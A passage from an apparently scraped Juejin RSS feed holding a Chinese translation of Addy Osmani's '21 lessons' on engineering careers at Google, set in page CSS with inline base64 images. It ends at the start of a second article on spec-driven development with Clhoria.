100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>原文链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Faddyosmani.com%2Fblog%2F21-lessons%2F" target="_blank" title="https://addyosmani.com/blog/21-lessons/" ref="nofollow noopener noreferrer">addyosmani.com/blog/21-les…</a></p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5dc7c5d4fe4c4d44986991f8e7eb45dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a6H5a6Z5LmL5LiA57Kf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770710179&amp;x-signature=YDHnRSKKfWid96qqk9PwWKS7t60%3D" alt="" loading="lazy"/></p>
<p>大约 14 年前，当我加入 Google 时，我以为这份工作的核心就是编写优秀的代码。我在一定程度上是对的。</p>
<p>但随着待的时间越长，我越发意识到，那些真正蓬勃发展的工程师，并不一定是编程技术最强的人——而是那些懂得如何驾驭代码之外一切因素的人：<strong>人际关系</strong>、政治博弈、目标对齐、以及<strong>各种不确定性</strong>。</p>
<p>这些是我希望自己能早点知道的经验教训。其中一些如果早点知道，可以帮我少走几个月的弯路；另一些则花了我数年时间才彻底参透。</p>
<p>这些经验无关具体的技术——技术更迭太快，根本无关紧要。它们关注的是那些反复出现的模式，无论项目还是团队，都如出一辙。</p>
<p>我分享这些经验，是因为我曾受益于其他工程师的帮助。这就当是我的一次回馈吧。</p>
<h2 data-id="heading-0">1. 最优秀的工程师都痴迷于解决用户问题</h2>
<p>爱上一项技术并到处寻找应用场景，这很有诱惑力，我也曾如此，每个人都曾如此。但真正创造最大价值的工程师却<strong>反其道而行之</strong>：他们专注于深入理解用户问题，并让解决方案从这种理解中自然而然地涌现。</p>
<p>以用户为中心意味着花时间处理支持工单，与用户沟通，观察用户遇到的困难，不断追问“为什么”，<strong>直到找到问题的症结所在</strong>。真正理解问题的工程师往往会发现，优雅的解决方案比任何人预想的都要简单。</p>
<p>从解决方案出发的工程师，往往是为了给方案找理由而制造复杂性。</p>
<h2 data-id="heading-1">2. 证明你是对的很容易，“一起达成共识”才是真本事</h2>
<p>即使你在技术上胜券在握，最终也可能输掉项目。我曾亲眼目睹一些才华横溢的工程师，因为总是自诩为房间里最聪明的人，而默默地积攒怨气。</p>
<p>这种怨气最终会在后期以“莫名其妙的执行问题”和“莫名其妙的阻力”的形式显现出来。</p>
<p>关键不在于证明自己正确，而在于进入讨论，在问题上达成一致，给他人留出空间，并对自己确信的观点保持怀疑。</p>
<p><strong>观点鲜明，但心态开放</strong>（Strong opinions, weakly held）——这不是因为你缺乏信念，而是因为在不确定性下做出的决策不应与个人身份绑定。</p>
<h2 data-id="heading-2">3. 行动至上。先发布</h2>
<p>你可以修改一个糟糕的页面，但无法修改空白页</p>
<p><strong>对完美的追求会让人裹足不前</strong>。我曾亲眼目睹工程师们花费数周时间争论他们从未实际构建过的产品的理想架构。</p>
<p>完美的解决方案很少仅仅依靠思考就能产生——它往往源于与现实的碰撞。 AI 在这方面能提供很多帮助。</p>
<p>先动手做，再把它做好，最后再做得更好。把粗糙的原型展示给用户。写出设计文档的初稿。发布那个让你略感尴尬的最小可行产品（MVP，最小可行性产品）。</p>
<p>从一周的真实反馈中学到的东西，比一个月的理论辩论要多得多。</p>
<p><strong>只有行动起来，方向才会清晰；陷在分析里，什么都做不成。</strong></p>
<h2 data-id="heading-3">4. 清晰是资深，炫技是负担</h2>
<p>写出“整洁”代码的本能在工程师中几乎是普遍存在的。这感觉像是能力的证明。</p>
<p>但软件工程的本质在于投入时间和精力，并与其他程序员协作。在这种环境下，清晰性并非风格偏好，而是降低运维风险的根本所在。</p>
<p>你的代码就像一份写给陌生人的策略备忘录，他们会在凌晨两点系统宕机时维护它。<strong>优化时要考虑他们的理解能力，而不是你的代码是否优美。</strong> 我最尊敬的高级工程师们都懂得，每次都要用清晰易懂来代替炫技。</p>
<h2 data-id="heading-4">5. 创新就像贷款，你需要通过停机、招聘和认知开销来偿还</h2>
<p>把你的技术选型看作是一个只有少量“创新筹码（Innovation Token）”预算的组织。每当你采用实质性的非标准技术时，就花掉一个筹码。你承担不起太多。</p>
<p>这里的重点不是“永远不要创新”。而是“只在你获得独特回报的地方创新”。其他一切应默认为“无聊”的技术，因为“无聊”意味着它的失败模式是众所周知的。</p>
<p>“最适合该工作的工具”往往是“在许多工作中表现最不差的工具”——因为运营一个技术栈的“动物园”才是真正的成本。</p>
<h2 data-id="heading-5">6. 你的代码不会为你代言，人会。</h2>
<p>在职业生涯早期，我相信优秀的工作成果会为自己代言。我错了。代码只是静静地躺在仓库里。你的经理会在会议上提到你，或者不会。同事会推荐你参与项目，或者是推荐别人。</p>
<p>在大型组织中，决策是在你没被邀请的会议上做出的，使用的是你没写的总结，而决策者只有五分钟时间，却要处理十二项优先事项。</p>
<p>如果没人能清晰地阐述你不在场时的影响，那么你的影响力实际上就变得可有可无了。</p>
<p>这不完全是关于自我推销，而是为了让所有人——包括你自己——都能清楚地了解价值链。</p>
<h2 data-id="heading-6">7. 最好的代码就是你永远不必编写的代码。</h2>
<p>在工程文化中，我们推崇创造。没有人会因为删除代码而获得晋升，尽管删减往往比增加更能改善系统。你没写的每一行代码，都是你永远不需要调试、维护或解释的一行。</p>
<p>在动工之前，先仔细思考一下：“如果我们不做这件事会发生什么？” 有时答案是“没什么坏处”，那就是你的解决方案。</p>
<p>问题不在于工程师不会写代码或使用 AI 写代码。问题在于我们太擅长写代码，以至于忘记了问是否应该写。</p>
<h2 data-id="heading-7">8. 在规模化之后，即便是你的 Bug 也有用户</h2>
<p>当用户数量足够多时，任何可观察到的行为都会变成依赖项——无论你做出过什么承诺。有人在抓取你的 API 数据，自动化利用你的缺陷，缓存你的 bug。</p>
<p>这产生了一个职业生涯层面的洞察：你不能把兼容性工作视为“维护”，而把新功能视为“真正的工作”。<strong>兼容性本身就是产品。</strong></p>
<p>将弃用设计成迁移方案，并预留时间、使用合适的工具，同时考虑到用户的需求。大多数所谓的“API 设计”实际上就是“API 退役”。</p>
<h2 data-id="heading-8">9. 大多数“慢”的团队实际上是“未对齐”的团队</h2>
<p>当项目拖延时，本能反应是责怪执行力：大家不够努力，技术选错了，工程师人手不足。通常这些都不是真正的问题。</p>
<p>在大公司里，团队是并发的单元，但随着团队数量的增加，协调成本呈几何级数增长。大多数缓慢实际上源于目标不一致——人们在做错误的事情，或者以不兼容的方式做正确的事情。</p>
<p>资深工程师花更多时间厘清方向、接口和优先级，而不是“更快地写代码”，因为真正的瓶颈就在这里。</p>
<h2 data-id="heading-9">10. 专注于你能控制的事情，忽略你无法控制的事情</h2>
<p>在大公司里，无数变量是你无法控制的——组织架构调整、管理层决策、市场变化、产品转型。纠结于这些只会带来没有行动力的焦虑。</p>
<p>那些保持理智和高效的工程师专注于他们的影响圈。你无法控制重组是否发生。你可以控制你的工作质量、应对方式以及从中学习到的东西。<strong>面对不确定性时，把问题拆解成若干部分，找出你可执行的具体行动。</strong></p>
<p>这不是被动接受，而是战略聚焦。<strong>花在无法改变的事情上的精力，就是从你可以改变的事情上偷走的精力。</strong></p>
<h2 data-id="heading-10">11. 抽象并不能消除复杂性，只会把它推迟到你值班（Oncall）的那一天</h2>
<p>每一个抽象层都是一个赌注，赌你不需要理解底层发生了什么。有时你赌赢了。但总会有漏洞，一旦出现漏洞，你就需要知道自己站在什么立场上。</p>
<p>资深工程师即使在技术栈变得更高层时，也会坚持学习“底层”知识。不是出于怀旧，而是出于对那个抽象层失效、凌晨 3 点你独自面对系统那一刻的敬畏。使用你的技术栈。</p>
<p>但要保持对其底层故障模式的心智模型。</p>
<h2 data-id="heading-11">12. 写作能使表达更清晰。学习和提高某项技能最快的方法就是尝试去教别人。</h2>
<p>写作倒逼清晰。当我向别人解释一个概念时——在文档中、演讲中、代码审查评论中，甚至只是与 AI 聊天——我会发现自己理解上的漏洞。让事情对别人变得清晰易懂的过程，也会让它对我自己更清晰。</p>
<p>这并不意味着你通过教授外科手术就能学会如何成为一名外科医生，但这个前提在软件工程领域仍然大体上成立。</p>
<p>这不仅仅是慷慨分享知识的问题，更是一种利己的学习技巧。如果你觉得自己理解了某个概念，试着用简单的语言解释它。你理解有误的地方，恰恰是你理解不够透彻的地方。</p>
<p>教学是在调试你自己的思维模型。</p>
<h2 data-id="heading-12">13. 使其他工作成为可能的工作是无价的——而且是看不见的。</h2>
<p>“胶水工作（Glue Work）”——文档、入职培训、跨团队协调、流程改进——至关重要。但如果你无意识地做这些，它会阻碍你的技术晋升并让你精疲力竭。陷阱在于把它当作“乐于助人”，而不是将其视为深思熟虑、有边界、可见的影响力。</p>
<p>给它设定时间框。轮流做。把它转化为产出物：文档、模板、自动化工具。让它作为影响力清晰可见，而不是作为一种性格特征。</p>
<p>“无价且隐形”的工作对你的职业生涯来说是一个危险的组合。</p>
<h2 data-id="heading-13">14. 如果你赢了每一场辩论，你很可能是在积累无声的阻力</h2>
<p>我学会了对自己过于自信的态度保持警惕。如果我“赢”得太容易，通常就说明出了问题。人们不再与你争论，不是因为你说服了他们，而是因为他们放弃了努力——他们会在实际行动中表达这种不满，而不是在会议上。</p>
<p>真正的共识需要更长时间。你必须真正理解其他人的观点，接受反馈，有时甚至需要公开改变想法。</p>
<p>短期内觉得自己是对的，这种感觉远不如与志同道合的伙伴一起长期建设事物来得重要。</p>
<h2 data-id="heading-14">15. 当一个指标成为目标时，它就不再是一个好的衡量标准</h2>
<p>你向管理层展示的每一个指标最终都会被博弈（Gamed）。不是出于恶意，而是因为人类会针对被衡量的东西进行优化。</p>
<p>如果你追踪代码行数，你会得到更多行数。如果你追踪开发速度（Velocity），你会得到过高的估算值。</p>
<p>高手的做法是：对每个指标请求都提供一对指标。一个用于衡量速度，一个用于衡量质量或风险。然后，坚持解读趋势，而不是盲目追求阈值。目标是洞察，而非监控。</p>
<h2 data-id="heading-15">16. 承认不知道比假装知道更能创造安全感</h2>
<p>说“我不知道”的资深工程师不是在示弱——他们是在鼓励大家坦诚面对。当领导者承认不确定性时，就等于在暗示其他人也可以这样做。</p>
<p>反之，就会形成一种人人假装理解、问题被掩盖直到爆发的文化。</p>
<p>我见过一些团队，资历最深的人从不承认自己不明白，我也目睹了由此造成的后果。没人提问，没人质疑既定假设。初级工程师保持沉默，因为他们以为其他人都懂了。</p>
<p>树立好奇心的榜样，你就会得到一个真正学习的团队。</p>
<h2 data-id="heading-16">17. 你的人脉关系比你拥有的任何一份工作都更长久</h2>
<p>职业生涯初期，我专注于工作，忽略了人脉拓展。现在看来，这是个错误。那些在公司内外都重视人脉关系的同事，在接下来的几十年里都受益匪浅。</p>
<p>他们能最先了解机会，更快地建立人脉，获得职位推荐，并与多年来建立信任的人共同创办企业。</p>
<p>你的工作不是永远的，但你的人脉是。带着好奇心和慷慨去拓展人脉，而不是抱着功利主义的心态。</p>
<p>当需要离开的时候，往往是人际关系为你打开大门。</p>
<h2 data-id="heading-17">18. 大多数性能提升来自于减少工作，而不是增加巧思</h2>
<p>当系统变慢时，本能反应是做加法：缓存层、并行处理、更智能的算法。有时这样做没错。但我发现，通过询问“我们计算了哪些不必要的东西？”往往能带来更多性能提升。</p>
<p>删除不必要的工作几乎总是比更快地完成必要的工作更有成效。最快的代码是永远不会运行的代码。</p>
<p>在进行优化之前，先问问自己这项工作是否应该存在。</p>
<h2 data-id="heading-18">19. 流程的存在是为了减少不确定性，而不是为了留痕</h2>
<p>最佳流程能使协调更便捷，降低失败成本。最糟糕的流程则是官僚作风——<strong>它的存在不是为了提供帮助，而是为了在事情出错时推卸责任</strong>。</p>
<p>如果你不能解释一个流程如何降低风险或增加清晰度，它可能只是纯粹的负担。</p>
<p>如果人们花在记录工作上的时间比做工作的时间还多，那就是有些地方大错特错了。</p>
<h2 data-id="heading-19">20. 最终，时间变得比金钱更值钱。要据此行事</h2>
<p>职业生涯初期，你用时间换取金钱——这无可厚非。但到了某个阶段，情况就完全不同了。你会开始意识到，时间才是不可再生资源。</p>
<p>我看着资深工程师为了追求下一个晋升职级而透支自己，只为了优化那几个百分点的薪酬。有些人确实升职了，但事后大多数人都在反思，自己放弃的一切是否值得。</p>
<p>答案不是“不努力工作”。而是“知道你真正想要什么，并深思熟虑地进行追求，然后舍弃什么”。</p>
<h2 data-id="heading-20">21. 没有捷径，但有复利</h2>
<p>专业技能来自于刻意练习——稍微超出你目前的能力范围，反思，重复。年复一年，没有捷径可走。</p>
<p>但令人欣慰的是：学习的进步在于创造新的选择，而不仅仅是积累新的知识。写作——不是为了吸引眼球，而是为了清晰表达。构建可复用的基础模型。<strong>将过往的经验总结成行动指南</strong>。</p>
<p>如果工程师把职业生涯看作是复利投资，而不是彩票，那么他最终往往会取得更大的成就。</p>
<h2 data-id="heading-21">最后一点想法</h2>
<p>二十一条建议听起来很多，但实际上它们归根结底就是几个核心理念：保持好奇心，保持谦逊，并记住工作始终与人有关——你为之构建的用户和与你一起构建的团队成员。</p>
<p>工程领域的职业生涯漫长，足以让人犯下无数错误，最终依然能够取得成功。我最敬佩的工程师并非那些事事都做得完美的人，而是那些从错误中吸取教训、分享发现、并坚持不懈的人。</p>
<p>如果你正处于职业生涯的初期，要知道随着时间的推移，你的旅程会越来越丰富。如果你已经深入其中，我希望这些话能引起你的共鸣。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[规范驱动开发实践：Clhoria 如何让 AI 真正理解你的后端项目]]></title>    <link>https://juejin.cn/post/7602201748230471699</link>    <guid>https://juejin.cn/post/7602201748230471699</guid>    <pubDate>2026-02-03T07:05:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602201748230471699" data-draft-id="7602401081264390180" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="规范驱动开发实践：Clhoria 如何让 AI 真正理解你的后端项目"/> <meta itemprop="keywords" content="前端,后端,JavaScript"/> <meta itemprop="datePublished" content="2026-02-03T07:05:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="折七"/> <meta itemprop="url" content="https://juejin.cn/user/2555693546079703"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            规范驱动开发实践：Clhoria 如何让 AI 真正理解你的后端项目
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2555693546079703/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    折七
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T07:05:59.000Z" title="Tue Feb 03 2026 07:05:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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